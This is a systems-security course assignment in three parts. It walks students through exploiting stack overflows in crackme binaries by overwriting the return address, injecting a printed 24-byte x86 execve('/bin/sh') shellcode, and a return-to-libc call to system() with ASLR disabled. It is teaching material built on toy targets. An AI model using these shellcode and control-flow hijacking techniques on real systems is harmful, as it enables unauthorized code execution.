## Part 1 (4pt): Control flow hijacking

### Prepration
Download *crackme0x00* from http://cs6332.syssec.org/crackmes/crackme0x00

### Description

In this assigment, we are going to hijack the control flow of *crackme0x00*
by overwriting the instruction pointer. As a first step, let's make it print
out "Password OK :)"!

```
$ objdump -d crackme0x00
...
    8048469:       e8 e2 fe ff ff          call   8048350 <strcmp@plt>
    804846e:       85 c0                   test   %eax,%eax
    8048470:       74 0e                   je     8048480 <main+0x6c>
    8048472:       c7 04 24 96 85 04 08    movl   $0x8048596,(%esp)
    8048479:       e8 c2 fe ff ff          call   8048340 <printf@plt>
    804847e:       eb 0c                   jmp    804848c <main+0x78>
 -> 8048480:       c7 04 24 a9 85 04 08    movl   $0x80485a9,(%esp)
    8048487:       e8 b4 fe ff ff          call   8048340 <printf@plt>
    804848c:       b8 00 00 00 00          mov    $0x0,%eax
    8048491:       c9                      leave
    8048492:       c3                      ret
```

main function will return to `0x08048480` such that it prints out "Password OK :)". Which characters in input should be changed to 0x08048480? Let me remind you that x86 is a little-endian machine.


### Output to submit

Save your attack payload to `input1`. The expected running example would be like the following.

    $ cat input1 | ./crackme0x00
    CS6332 Crackme Level 00
    Password: Invalid Password!
    Password OK :)
    Segmentation fault


## Part 2 (8 piont): Jump Shellcode 

### Prepration
Download *crackme0x00-nonx* from http://cs6332.syssec.org/crackmes/crackme0x00-nonx and check its binary to ensure stack section (*GNU_STACK*) is in `RWE` permission which mean you can write and run a shellcode snippet from stack.

```
$ readelf -W -l ./crackme0x00-nonx|grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

### Description

From this assignment, Peda will generate a shellcode. You will craft an input to overwrite the stack with shellcode and transfer control the beginning of shellcode as *main()* function returns.

Peda generates a shellcode snippet for you.
```
gdb-peda$ shellcode generate x86/linux exec
# x86/linux/exec: 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)
```
which disassembled as below.

Check shellcode length, and make sure shellcode should fit in to stack.

```python
>>> shellcode = (
...     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
...     "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
... )
>>> len(shellcode)
24
```

```
$ objdump -j .text -d crackme0x00-nonx
...
5bc:	83 ec 20             	sub    $0x20,%esp
...
```

Create an input that would run *shellcode* and subsequently give */bin/sh* prompt. 

### Output to submit

Save your attack payload to `input2`. The expected running example would be like the following.

    $ cat input2 | ./crackme0x00-nonx
    CS6332 Crackme Level 00
    Password: Invalid Password!
    $ whoami
    kjee


## Part 3 (8 point): Return-to-libc

### Prepration
For this part, we will use *crackme0x00* binary again. Download *crackme0x00* from http://cs6332.syssec.org/crackmes/crackme0x00 and check its binary to ensure stack section (*GNU_STACK*) is in `RW` permission which mean you can overwrite a stack, but cannot run any code from there.

```
$ readelf -W -l ./crackme0x00|grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
```

You need to turn off ASLR from your system in order for libraries loaded to a fixed address across different executions.

```
$ sudo echo 0 > /proc/sys/kernel/randomize_va_space
$ cat /proc/sys/kernel/randomize_va_space
0
```

### Description

From this part of the assignment, you can still hijack the control by overwriting the return address, but you donâ€™t know where to transfer the control, to run the desired command (say */bin/sh*). In this part of the assignment, we want to use *system()* function provided by Glibc library. For its usage, please check out `man -s 3 system`.

Please write an input that would overwrite the address of *system()* to return address of main() and transfer the control at main() returns. Don't forget to prepare the argument (*/bin/sh*) of the function call from the stack.

#### *system()* function example
The above snippet would give you a command prompt. 

```bash
$ cat << EOF > /tmp/system.c
#include <stdlib.h>
// system.c
int main() {
    system("/bin/sh");
}
EOF

$ gcc  /tmp/system.c
$ ./a.out
$ whoami
kjee
```

### Obtaining address of *system()* at runtime

* GDB (Peda) will the address of *system()* at runtime. 

```
$ gdb  crackme0x00
gdb-peda$ b main
gdb-peda$ run
...

gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e26d10 <system>
```
`0xf7e26d10` is address that you want to return to run the function.


### Output to submit

Save your attack payload to `input3`. The expected running example would be like the following.

    $ cat input3 | ./crackme0x00
    CS6332 Crackme Level 00
    Password: Invalid Password!
    $ whoami
    kjee
